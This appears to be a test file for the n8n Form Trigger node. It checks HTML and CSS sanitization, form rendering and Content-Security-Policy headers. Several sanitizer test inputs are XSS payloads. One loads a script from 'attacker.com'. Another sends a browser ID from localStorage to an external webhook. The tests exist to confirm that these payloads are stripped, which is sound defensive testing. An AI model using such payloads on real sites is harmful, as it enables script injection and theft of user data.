vi.mock('n8n-core', () => ({
	getHtmlSandboxCSP: vi.fn(
		() =>
			'sandbox allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols',
	),
	isFormHtmlSandboxingDisabled: vi.fn(() => false),
	// Empty stand-in: the test registers a fake instance via `Container.set`
	// below so `Container.get(InstanceSettings)` returns that object directly.
	InstanceSettings: class {},
}));

// The node util is loaded through vite here, so vi.mock intercepts its `fs/promises` import.
vi.mock('fs/promises', async () => ({
	...(await vi.importActual<typeof _fsPromises>('fs/promises')),
	rm: vi.fn(),
}));

import { rm } from 'fs/promises';
import type * as _fsPromises from 'fs/promises';
import { Container } from '@n8n/di';
import type { Request } from 'express';
import jwt from 'jsonwebtoken';
import { mock } from 'vitest-mock-extended';
import { DateTime } from 'luxon';
import { InstanceSettings } from 'n8n-core';
import type {
	CredentialCheckResult,
	CredentialCheckStatus,
	FormFieldsParameter,
	IDataObject,
	INode,
	INodeExecutionData,
	IWebhookFunctions,
	IWorkflowSettings,
	MultiPartFormData,
	NodeTypeAndVersion,
} from 'n8n-workflow';
import { BINARY_MODE_COMBINED, FORM_TRIGGER_NODE_TYPE, WAIT_NODE_TYPE } from 'n8n-workflow';

import {
	formWebhook,
	createDescriptionMetadata,
	prepareFormData,
	prepareFormReturnItem,
	resolveRawData,
	isFormConnected,
	sanitizeHtml,
	sanitizeCustomCss,
	validateResponseModeConfiguration,
	prepareFormFields,
	addFormResponseDataToReturnItem,
	validateSafeRedirectUrl,
	handleNewlines,
	parseFormFields,
	validateFormPageAuth,
	generateFormUserAuthToken,
	verifyFormUserAuthToken,
} from '../utils/utils';
import { isIpAllowed } from '../../Webhook/utils';
import type { Mock } from 'vitest';

Container.set(InstanceSettings, { hmacSignatureSecret: 'test-hmac-secret' } as InstanceSettings);

describe('FormTrigger, parseFormDescription', () => {
	it('should remove HTML tags and truncate to 150 characters', () => {
		const descriptions = [
			{ description: '<p>This is a test description</p>', expected: 'This is a test description' },
			{ description: 'Test description', expected: 'Test description' },
			{
				description:
					'Beneath the golden hues of a setting sun, waves crashed against the rugged shore, carrying whispers of ancient tales etched in natures timeless and soothing song.',
				expected:
					'Beneath the golden hues of a setting sun, waves crashed against the rugged shore, carrying whispers of ancient tales etched in natures timeless and so',
			},
			{
				description:
					'<p>Beneath the golden hues of a setting sun, waves crashed against the rugged shore, carrying whispers of ancient tales etched in natures timeless and soothing song.</p>',
				expected:
					'Beneath the golden hues of a setting sun, waves crashed against the rugged shore, carrying whispers of ancient tales etched in natures timeless and so',
			},
		];

		descriptions.forEach(({ description, expected }) => {
			expect(createDescriptionMetadata(description)).toBe(expected);
		});
	});
});

describe('FormTrigger, sanitizeHtml', () => {
	it('should remove forbidden HTML tags', () => {
		const givenHtml = [
			{
				html: '<script>alert("hello world")</script>',
				expected: '',
			},
			{
				html: '<style>body { color: red; }</style>',
				expected: '',
			},
			{
				html: '<input type="text" value="test">',
				expected: '',
			},
			{
				html: '<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">Your browser does not support the video tag.</video>',
				expected:
					'<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></source>Your browser does not support the video tag.</video>',
			},
			{
				html: '<video controls width="640" height="360" onclick="alert(\'XSS\')" style="border:10px solid red;"><source src="javascript:alert(\'XSS\')" type="video/mp4">Fallback text</video>',
				expected:
					'<video controls width="640" height="360"><source type="video/mp4"></source>Fallback text</video>',
			},
			{
				html: "<video><source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
				expected: '<video><source></source></video>',
			},
			{
				html: "<iframe srcdoc=\"<script>fetch('https://YOURDOMAIN.app.n8n.cloud/webhook/pepe?id='+localStorage.getItem('n8n-browserId'))</script>\"></iframe>",
				expected:
					'<iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe>',
			},
		];

		givenHtml.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should allow table elements and preserve structure', () => {
		const tableTestCases = [
			{
				html: '<table><tr><td>Cell content</td></tr></table>',
				expected: '<table><tr><td>Cell content</td></tr></table>',
			},
			{
				html: '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>',
				expected:
					'<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>',
			},
			{
				html: '<table><thead><tr><th>Name</th><th>Age</th></tr></thead><tbody><tr><td>John</td><td>30</td></tr><tr><td>Jane</td><td>25</td></tr></tbody></table>',
				expected:
					'<table><thead><tr><th>Name</th><th>Age</th></tr></thead><tbody><tr><td>John</td><td>30</td></tr><tr><td>Jane</td><td>25</td></tr></tbody></table>',
			},
		];

		tableTestCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should allow tfoot elements and preserve table footer structure', () => {
		const tfootTestCases = [
			{
				html: '<table><tfoot><tr><td>Footer content</td></tr></tfoot></table>',
				expected: '<table><tfoot><tr><td>Footer content</td></tr></tfoot></table>',
			},
			{
				html: '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody><tfoot><tr><td>Footer</td></tr></tfoot></table>',
				expected:
					'<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody><tfoot><tr><td>Footer</td></tr></tfoot></table>',
			},
			{
				html: '<table><tfoot><tr><th>Total</th><td>$100</td></tr></tfoot></table>',
				expected: '<table><tfoot><tr><th>Total</th><td>$100</td></tr></tfoot></table>',
			},
		];

		tfootTestCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should preserve table cell attributes (colspan, rowspan, scope, headers)', () => {
		const cellAttributeTestCases = [
			{
				html: '<table><tr><td colspan="2">Spanning cell</td></tr></table>',
				expected: '<table><tr><td colspan="2">Spanning cell</td></tr></table>',
			},
			{
				html: '<table><tr><th rowspan="3">Header</th><td>Data 1</td></tr><tr><td>Data 2</td></tr><tr><td>Data 3</td></tr></table>',
				expected:
					'<table><tr><th rowspan="3">Header</th><td>Data 1</td></tr><tr><td>Data 2</td></tr><tr><td>Data 3</td></tr></table>',
			},
			{
				html: '<table><tr><th scope="col">Column Header</th></tr><tr><th scope="row">Row Header</th><td>Data</td></tr></table>',
				expected:
					'<table><tr><th scope="col">Column Header</th></tr><tr><th scope="row">Row Header</th><td>Data</td></tr></table>',
			},
			{
				html: '<table><tr><th id="header1">Name</th><th id="header2">Age</th></tr><tr><td headers="header1">John</td><td headers="header2">30</td></tr></table>',
				expected:
					'<table><tr><th>Name</th><th>Age</th></tr><tr><td headers="header1">John</td><td headers="header2">30</td></tr></table>',
			},
			{
				html: '<table><tr><td colspan="2" rowspan="2">Complex cell</td><td>Simple cell</td></tr></table>',
				expected:
					'<table><tr><td colspan="2" rowspan="2">Complex cell</td><td>Simple cell</td></tr></table>',
			},
		];

		cellAttributeTestCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should strip malicious attributes from table cells while preserving allowed ones', () => {
		const maliciousCellTestCases = [
			{
				html: '<td onclick="alert(\'XSS\')" colspan="2" style="color: red;">Safe content</td>',
				expected: '<td colspan="2">Safe content</td>',
			},
			{
				html: '<th onmouseover="steal()" rowspan="3" class="malicious" scope="col">Header</th>',
				expected: '<th rowspan="3" scope="col">Header</th>',
			},
			{
				html: '<td headers="header1" data-evil="payload" onerror="hack()">Data</td>',
				expected: '<td headers="header1">Data</td>',
			},
			{
				html: '<th colspan="2" rowspan="2" onclick="javascript:alert(\'XSS\')" scope="colgroup">Multi-span header</th>',
				expected: '<th colspan="2" rowspan="2" scope="colgroup">Multi-span header</th>',
			},
		];

		maliciousCellTestCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should handle complex table structures with tfoot and cell attributes', () => {
		const complexTableTestCases = [
			{
				html: '<table><thead><tr><th colspan="2" scope="colgroup">Sales Report</th></tr><tr><th scope="col">Product</th><th scope="col">Revenue</th></tr></thead><tbody><tr><th scope="row">Widget A</th><td>$1,000</td></tr><tr><th scope="row">Widget B</th><td>$2,000</td></tr></tbody><tfoot><tr><th scope="row">Total</th><td colspan="1">$3,000</td></tr></tfoot></table>',
				expected:
					'<table><thead><tr><th colspan="2" scope="colgroup">Sales Report</th></tr><tr><th scope="col">Product</th><th scope="col">Revenue</th></tr></thead><tbody><tr><th scope="row">Widget A</th><td>$1,000</td></tr><tr><th scope="row">Widget B</th><td>$2,000</td></tr></tbody><tfoot><tr><th scope="row">Total</th><td colspan="1">$3,000</td></tr></tfoot></table>',
			},
			{
				html: '<table><tbody><tr><td rowspan="2">Multi-row cell</td><td>Cell 1</td></tr><tr><td>Cell 2</td></tr></tbody><tfoot><tr><td colspan="2">Footer spans both columns</td></tr></tfoot></table>',
				expected:
					'<table><tbody><tr><td rowspan="2">Multi-row cell</td><td>Cell 1</td></tr><tr><td>Cell 2</td></tr></tbody><tfoot><tr><td colspan="2">Footer spans both columns</td></tr></tfoot></table>',
			},
		];

		complexTableTestCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should remove malicious attributes from table elements', () => {
		const maliciousTableCases = [
			{
				html: '<table onclick="alert(\'XSS\')" class="malicious"><tr><td>Content</td></tr></table>',
				expected: '<table><tr><td>Content</td></tr></table>',
			},
			{
				html: '<thead onmouseover="steal()" id="header"><tr><th onclick="hack()">Header</th></tr></thead>',
				expected: '<thead><tr><th>Header</th></tr></thead>',
			},
			{
				html: '<tbody style="background: red;" data-evil="payload"><tr><td onerror="malicious()">Data</td></tr></tbody>',
				expected: '<tbody><tr><td>Data</td></tr></tbody>',
			},
			{
				html: '<tr onload="alert(\'XSS\')" class="row"><td onblur="steal()" title="tooltip">Cell</td></tr>',
				expected: '<tr><td>Cell</td></tr>',
			},
			{
				html: '<th onclick="javascript:alert(\'XSS\')" style="color: red;">Header</th>',
				expected: '<th>Header</th>',
			},
			{
				html: '<td onmouseover="malicious()" data-payload="evil">Cell Data</td>',
				expected: '<td>Cell Data</td>',
			},
		];

		maliciousTableCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should handle nested content within table elements', () => {
		const nestedTableCases = [
			{
				html: '<table><tr><td><strong>Bold</strong> and <em>italic</em> text</td></tr></table>',
				expected: '<table><tr><td><strong>Bold</strong> and <em>italic</em> text</td></tr></table>',
			},
			{
				html: '<table><thead><tr><th><a href="https://example.com">Link Header</a></th></tr></thead></table>',
				expected:
					'<table><thead><tr><th><a href="https://example.com">Link Header</a></th></tr></thead></table>',
			},
			{
				html: '<table><tbody><tr><td><ul><li>Item 1</li><li>Item 2</li></ul></td></tr></tbody></table>',
				expected:
					'<table><tbody><tr><td><ul><li>Item 1</li><li>Item 2</li></ul></td></tr></tbody></table>',
			},
			{
				html: '<table><tr><td><code>code snippet</code> and <pre>preformatted text</pre></td></tr></table>',
				expected:
					'<table><tr><td><code>code snippet</code> and <pre>preformatted text</pre></td></tr></table>',
			},
		];

		nestedTableCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should handle malformed table structures gracefully', () => {
		const malformedTableCases = [
			{
				html: '<table><td>Cell without row</td></table>',
				expected: '<table><td>Cell without row</td></table>',
			},
			{
				html: '<thead><th>Header without table</th></thead>',
				expected: '<thead><th>Header without table</th></thead>',
			},
			{
				html: '<tbody><tr><td>Unclosed table',
				expected: '<tbody><tr><td>Unclosed table</td></tr></tbody>',
			},
			{
				html: '<tr><th>Mixed header</th><td>and data</td></tr>',
				expected: '<tr><th>Mixed header</th><td>and data</td></tr>',
			},
		];

		malformedTableCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should prevent XSS attacks through table elements', () => {
		const xssTableCases = [
			{
				html: '<table><tr><td><script>alert("XSS")</script>Safe content</td></tr></table>',
				expected: '<table><tr><td>Safe content</td></tr></table>',
			},
			{
				html: '<thead><tr><th><img src="x" onerror="alert(\'XSS\')">Header</th></tr></thead>',
				expected: '<thead><tr><th><img src="x" />Header</th></tr></thead>',
			},
			{
				html: '<tbody><tr><td><a href="javascript:alert(\'XSS\')">Malicious Link</a></td></tr></tbody>',
				expected: '<tbody><tr><td><a>Malicious Link</a></td></tr></tbody>',
			},
			{
				html: '<table><tr><td><iframe src="javascript:alert(\'XSS\')"></iframe></td></tr></table>',
				expected:
					'<table><tr><td><iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe></td></tr></table>',
			},
		];

		xssTableCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});

	it('should preserve complex table layouts', () => {
		const complexTableCases = [
			{
				html: '<table><thead><tr><th>Product</th><th>Price</th><th>Stock</th></tr></thead><tbody><tr><td>Widget A</td><td>$10.99</td><td>50</td></tr><tr><td>Widget B</td><td>$15.99</td><td>25</td></tr></tbody></table>',
				expected:
					'<table><thead><tr><th>Product</th><th>Price</th><th>Stock</th></tr></thead><tbody><tr><td>Widget A</td><td>$10.99</td><td>50</td></tr><tr><td>Widget B</td><td>$15.99</td><td>25</td></tr></tbody></table>',
			},
			{
				html: '<table><tr><th>Q1</th><th>Q2</th><th>Q3</th><th>Q4</th></tr><tr><td>100</td><td>150</td><td>200</td><td>175</td></tr></table>',
				expected:
					'<table><tr><th>Q1</th><th>Q2</th><th>Q3</th><th>Q4</th></tr><tr><td>100</td><td>150</td><td>200</td><td>175</td></tr></table>',
			},
		];

		complexTableCases.forEach(({ html, expected }) => {
			expect(sanitizeHtml(html)).toBe(expected);
		});
	});
});

describe('sanitizeCustomCss', () => {
	it('should return undefined for undefined input', () => {
		expect(sanitizeCustomCss(undefined)).toBeUndefined();
	});

	it('should return undefined for empty string', () => {
		expect(sanitizeCustomCss('')).toBeUndefined();
	});

	it('should preserve CSS child combinator selectors (>)', () => {
		const css = '#n8n-form > div.form-header > p { text-align: left; }';
		expect(sanitizeCustomCss(css)).toBe(css);
	});

	it('should preserve CSS adjacent sibling selectors (+)', () => {
		const css = 'h1 + p { margin-top: 0; }';
		expect(sanitizeCustomCss(css)).toBe(css);
	});

	it('should preserve CSS general sibling selectors (~)', () => {
		const css = 'h1 ~ p { color: gray; }';
		expect(sanitizeCustomCss(css)).toBe(css);
	});

	it('should remove script tags from CSS', () => {
		const css = '.container { color: red; }<script>alert("xss")</script>';
		expect(sanitizeCustomCss(css)).toBe('.container { color: red; }');
	});

	it('should remove style closing tags that could break out of style block', () => {
		const css = '.container { color: red; }</style><script>alert("xss")</script>';
		expect(sanitizeCustomCss(css)).toBe('.container { color: red; }');
	});

	it('should preserve url() in CSS', () => {
		const css = '.bg { background-image: url(https://example.com/image.png); }';
		expect(sanitizeCustomCss(css)).toBe(css);
	});

	it('should preserve complex CSS with multiple selectors and properties', () => {
		const css = `
			#n8n-form > div.form-header > p { text-align: left; }
			.form-container > .input-group + .input-group { margin-top: 1rem; }
			button:hover { background-color: #0056b3; }
		`;
		expect(sanitizeCustomCss(css)).toBe(css);
	});
});

describe('FormTrigger, formWebhook', () => {
	const executeFunctions = mock<IWebhookFunctions>();
	executeFunctions.getNode.mockReturnValue({ typeVersion: 2.1 } as any);
	executeFunctions.getNodeParameter.calledWith('options').mockReturnValue({});
	executeFunctions.getNodeParameter.calledWith('formTitle').mockReturnValue('Test Form');
	executeFunctions.getNodeParameter
		.calledWith('formDescription')
		.mockReturnValue('Test Description');
	executeFunctions.getNodeParameter.calledWith('responseMode').mockReturnValue('onReceived');
	executeFunctions.getNodeParameter.calledWith('authentication', 'none').mockReturnValue('none');
	executeFunctions.getRequestObject.mockReturnValue({ method: 'GET', query: {} } as any);
	executeFunctions.getMode.mockReturnValue('manual');
	executeFunctions.getInstanceId.mockReturnValue('instanceId');
	executeFunctions.getBodyData.mockReturnValue({ data: {}, files: {} });
	executeFunctions.getChildNodes.mockReturnValue([]);

	beforeEach(() => {
		vi.clearAllMocks();
	});

	it('renders the form when the node has no stored authentication parameter', async () => {
		const ctx = mock<IWebhookFunctions>();
		ctx.getNode.mockReturnValue({ typeVersion: 1, name: 'Form Trigger' } as INode);

		// Mirror the engine: getNodeParameter throws when the key is absent and
		// no default is supplied, but returns the default when one is given.
		ctx.getNodeParameter.calledWith('authentication').mockImplementation(() => {
			throw new Error('Could not get parameter');
		});
		ctx.getNodeParameter.calledWith('authentication', 'none').mockReturnValue('none');

		ctx.getNodeParameter.calledWith('options').mockReturnValue({});
		ctx.getNodeParameter.calledWith('formFields.values').mockReturnValue([]);
		ctx.getNodeParameter.calledWith('formTitle').mockReturnValue('Test Form');
		ctx.getNodeParameter.calledWith('formDescription').mockReturnValue('');
		ctx.getNodeParameter.calledWith('responseMode').mockReturnValue('onReceived');

		ctx.getRequestObject.mockReturnValue({ method: 'GET', query: {}, headers: {} } as any);
		ctx.getResponseObject.mockReturnValue({ render: vi.fn(), setHeader: vi.fn() } as any);
		ctx.getMode.mockReturnValue('manual');
		ctx.getInstanceId.mockReturnValue('instanceId');
		ctx.getChildNodes.mockReturnValue([]);

		await expect(formWebhook(ctx)).resolves.toEqual({ noWebhookResponse: true });
	});

	// Only a form that identifies the submitter can hit the submit-time credential
	// gate, so the rest must not ship its client-side handling.
	it('omits the credential-gate flag for a form that cannot be gated', async () => {
		const mockRender = vi.fn();

		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue([]);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: vi.fn(),
		} as any);

		await formWebhook(executeFunctions);

		expect(mockRender.mock.calls[0][1].hasAuthenticatedSubmitter).toBeUndefined();
	});

	it('should call response render', async () => {
		const mockRender = vi.fn();

		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
			{ fieldLabel: 'Age', fieldType: 'number', requiredField: false },
			{
				fieldLabel: 'Gender',
				fieldType: 'select',
				requiredField: true,
				fieldOptions: { values: [{ option: 'Male' }, { option: 'Female' }] },
			},
			{
				fieldLabel: 'Resume',
				fieldType: 'file',
				requiredField: true,
				acceptFileTypes: '.pdf,.doc',
				multipleFiles: false,
			},
			{
				fieldLabel: 'Custom HTML',
				fieldType: 'html',
				html: '<div>Test HTML</div>',
				requiredField: false,
			},
			{
				fieldName: 'Powerpuff Girl',
				fieldValue: 'Blossom',
				fieldType: 'hiddenField',
				fieldLabel: '',
			},
		];

		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: vi.fn(),
		} as any);

		await formWebhook(executeFunctions);

		expect(mockRender).toHaveBeenCalledWith('form-trigger', {
			appendAttribution: true,
			buttonLabel: 'Submit',
			formDescription: 'Test Description',
			formDescriptionMetadata: 'Test Description',
			formFields: [
				{
					defaultValue: '',
					errorId: 'error-field-0',
					id: 'field-0',
					inputRequired: 'form-required',
					isInput: true,
					label: 'Name',
					placeholder: undefined,
					type: 'text',
				},
				{
					defaultValue: '',
					errorId: 'error-field-1',
					id: 'field-1',
					inputRequired: '',
					isInput: true,
					label: 'Age',
					placeholder: undefined,
					type: 'number',
				},
				{
					defaultValue: '',
					errorId: 'error-field-2',
					id: 'field-2',
					inputRequired: 'form-required',
					isInput: true,
					label: 'Gender',
					placeholder: undefined,
					type: 'select',
				},
				{
					acceptFileTypes: '.pdf,.doc',
					defaultValue: '',
					errorId: 'error-field-3',
					id: 'field-3',
					inputRequired: 'form-required',
					isFileInput: true,
					label: 'Resume',
					multipleFiles: '',
					placeholder: undefined,
				},
				{
					id: 'field-4',
					errorId: 'error-field-4',
					label: 'Custom HTML',
					inputRequired: '',
					defaultValue: '',
					placeholder: undefined,
					html: '<div>Test HTML</div>',
					isHtml: true,
				},
				{
					id: 'field-5',
					errorId: 'error-field-5',
					hiddenName: 'Powerpuff Girl',
					hiddenValue: 'Blossom',
					label: 'Powerpuff Girl',
					isHidden: true,
					inputRequired: '',
					defaultValue: '',
					placeholder: undefined,
				},
			],
			formSubmittedText: 'Your response has been recorded',
			formTitle: 'Test Form',
			n8nWebsiteLink:
				'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=instanceId',
			testRun: true,
			useResponseData: false,
		});
	});

	it('should resolve expressions inside html field content', async () => {
		const mockRender = vi.fn();

		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Custom HTML',
				fieldType: 'html',
				html: '<div>{{ $json.test }}</div>',
				requiredField: false,
			},
		];

		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.evaluateExpression
			.calledWith('{{ $json.test }}')
			.mockReturnValue('TEST VALUE' as any);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: vi.fn(),
		} as any);

		await formWebhook(executeFunctions);

		const renderArgs = mockRender.mock.calls[0][1];
		expect(renderArgs.formFields[0].html).toBe('<div>TEST VALUE</div>');
	});

	it('should sanitize form descriptions', async () => {
		const mockRender = vi.fn();

		const formDescription = [
			{ description: 'Test Description', expected: 'Test Description' },
			{ description: '<i>hello</i>', expected: '<i>hello</i>' },
			{ description: '<script>alert("hello world")</script>', expected: '' },
		];
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
		];

		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: vi.fn(),
		} as any);

		for (const { description, expected } of formDescription) {
			executeFunctions.getNodeParameter.calledWith('formDescription').mockReturnValue(description);

			await formWebhook(executeFunctions);

			expect(mockRender).toHaveBeenCalledWith('form-trigger', {
				appendAttribution: true,
				buttonLabel: 'Submit',
				formDescription: expected,
				formDescriptionMetadata: createDescriptionMetadata(expected),
				formFields: [
					{
						defaultValue: '',
						errorId: 'error-field-0',
						id: 'field-0',
						inputRequired: 'form-required',
						isInput: true,
						label: 'Name',
						placeholder: undefined,
						type: 'text',
					},
				],
				formSubmittedText: 'Your response has been recorded',
				formTitle: 'Test Form',
				n8nWebsiteLink:
					'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=instanceId',
				testRun: true,
				useResponseData: false,
			});
		}
	});

	it.each([
		['\\n', '\n'],
		['\\\\n', '\\n'],
	])('should replace %j with %j in form descriptions', async (pattern, replacement) => {
		const description = `Some message${pattern}Other text`;
		const expected = `Some message${replacement}Other text`;
		const mockRender = vi.fn();
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
		];
		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: vi.fn(),
		} as any);
		executeFunctions.getNodeParameter.calledWith('formDescription').mockReturnValue(description);

		await formWebhook(executeFunctions);

		expect(mockRender).toHaveBeenCalledWith('form-trigger', {
			appendAttribution: true,
			buttonLabel: 'Submit',
			formDescription: expected,
			formDescriptionMetadata: createDescriptionMetadata(expected),
			formFields: [
				{
					defaultValue: '',
					errorId: 'error-field-0',
					id: 'field-0',
					inputRequired: 'form-required',
					isInput: true,
					label: 'Name',
					placeholder: undefined,
					type: 'text',
				},
			],
			formSubmittedText: 'Your response has been recorded',
			formTitle: 'Test Form',
			n8nWebsiteLink:
				'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=instanceId',
			testRun: true,
			useResponseData: false,
		});
	});

	it('should return workflowData on POST request', async () => {
		const mockStatus = vi.fn();
		const mockEnd = vi.fn();

		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
			{ fieldLabel: 'Age', fieldType: 'number', requiredField: false },
		];

		const bodyData = {
			'field-0': 'John Doe',
			'field-1': '30',
		};

		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({ status: mockStatus, end: mockEnd } as any);
		executeFunctions.getRequestObject.mockReturnValue({
			method: 'POST',
			contentType: 'multipart/form-data',
		} as any);
		executeFunctions.getBodyData.mockReturnValue({ data: bodyData, files: {} });
		executeFunctions.getWorkflowSettings.mockReturnValue(mock<IWorkflowSettings>({}));

		const result = await formWebhook(executeFunctions);

		expect(result).toEqual({
			webhookResponse: { status: 200 },
			workflowData: [
				[
					{
						json: {
							Name: 'John Doe',
							Age: 30,
							submittedAt: expect.any(String),
							formMode: 'test',
						},
					},
				],
			],
		});
	});

	it('should set Content-Security-Policy header with sandbox CSP on GET request', async () => {
		const mockRender = vi.fn();
		const mockSetHeader = vi.fn();

		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
		];

		executeFunctions.getNode.mockReturnValue({ typeVersion: 2.1 } as any);
		executeFunctions.getNodeParameter.calledWith('options').mockReturnValue({});
		executeFunctions.getNodeParameter.calledWith('formTitle').mockReturnValue('Test Form');
		executeFunctions.getNodeParameter.calledWith('formDescription').mockReturnValue('Test');
		executeFunctions.getNodeParameter.calledWith('responseMode').mockReturnValue('onReceived');
		executeFunctions.getRequestObject.mockReturnValue({ method: 'GET', query: {} } as any);
		executeFunctions.getMode.mockReturnValue('manual');
		executeFunctions.getInstanceId.mockReturnValue('instanceId');
		executeFunctions.getChildNodes.mockReturnValue([]);
		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: mockSetHeader,
		} as any);

		await formWebhook(executeFunctions);

		expect(mockSetHeader).toHaveBeenCalledWith(
			'Content-Security-Policy',
			'sandbox allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols',
		);
	});

	it('should include sandbox directive in CSP header for security', async () => {
		const mockRender = vi.fn();
		const mockSetHeader = vi.fn();

		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
		];

		executeFunctions.getNode.mockReturnValue({ typeVersion: 2.1 } as any);
		executeFunctions.getNodeParameter.calledWith('options').mockReturnValue({});
		executeFunctions.getNodeParameter.calledWith('formTitle').mockReturnValue('Test Form');
		executeFunctions.getNodeParameter.calledWith('formDescription').mockReturnValue('Test');
		executeFunctions.getNodeParameter.calledWith('responseMode').mockReturnValue('onReceived');
		executeFunctions.getRequestObject.mockReturnValue({ method: 'GET', query: {} } as any);
		executeFunctions.getMode.mockReturnValue('manual');
		executeFunctions.getInstanceId.mockReturnValue('instanceId');
		executeFunctions.getChildNodes.mockReturnValue([]);
		executeFunctions.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
		executeFunctions.getResponseObject.mockReturnValue({
			render: mockRender,
			setHeader: mockSetHeader,
		} as any);

		await formWebhook(executeFunctions);

		expect(mockSetHeader).toHaveBeenCalledWith(
			'Content-Security-Policy',
			expect.stringContaining('sandbox'),
		);
	});

	describe('n8nUserAuth with OAuth2 flow', () => {
		const authedUser = {
			id: 'user-1',
			email: 'user@example.com',
			firstName: 'Test',
			lastName: 'User',
		};
		const formFields: FormFieldsParameter = [
			{ fieldLabel: 'Name', fieldType: 'text', requiredField: true },
		];
		const resourceUrl = 'http://localhost:5678/form/test';

		const setupContext = (
			ctx: ReturnType<typeof mock<IWebhookFunctions>>,
			overrides: {
				method: 'GET' | 'POST';
				query?: IDataObject;
				headers?: Record<string, string>;
				originalUrl?: string;
				nodeType?: string;
				options?: IDataObject;
			} = { method: 'GET' },
		) => {
			const send = vi.fn();
			const json = vi.fn();
			const status = vi.fn(() => ({ send, json })) as any;
			const writeHead = vi.fn();
			const end = vi.fn();
			const setHeader = vi.fn();
			const render = vi.fn();
			const cookie = vi.fn();
			const clearCookie = vi.fn();
			const request = {
				method: overrides.method,
				originalUrl: overrides.originalUrl ?? '/form/test',
				query: overrides.query ?? {},
				headers: { host: 'localhost:5678', ...(overrides.headers ?? {}) },
				protocol: 'http',
				contentType: overrides.method === 'POST' ? 'multipart/form-data' : undefined,
			};

			ctx.getNode.mockReturnValue({
				typeVersion: 2.6,
				type: overrides.nodeType ?? FORM_TRIGGER_NODE_TYPE,
			} as INode);
			ctx.getNodeParameter.calledWith('options').mockReturnValue(overrides.options ?? {});
			ctx.getNodeParameter.calledWith('formTitle').mockReturnValue('Test Form');
			ctx.getNodeParameter.calledWith('formDescription').mockReturnValue('Test Description');
			ctx.getNodeParameter.calledWith('responseMode').mockReturnValue('onReceived');
			ctx.getNodeParameter.calledWith('authentication', 'none').mockReturnValue('n8nUserAuth');
			ctx.getNodeParameter.calledWith('formFields.values').mockReturnValue(formFields);
			ctx.getWebhookResourceUrl.mockReturnValue(resourceUrl);
			ctx.getRequestObject.mockReturnValue(request as any);
			ctx.getHeaderData.mockReturnValue(request.headers);
			ctx.getResponseObject.mockReturnValue({
				status,
				writeHead,
				end,
				setHeader,
				render,
				cookie,
				clearCookie,
			} as any);
			ctx.getMode.mockReturnValue('manual');
			ctx.getInstanceId.mockReturnValue('instanceId');
			ctx.getBodyData.mockReturnValue({ data: { 'field-0': 'John' }, files: {} });
			ctx.getWorkflowSettings.mockReturnValue(mock<IWorkflowSettings>({}));
			ctx.getChildNodes.mockReturnValue([]);
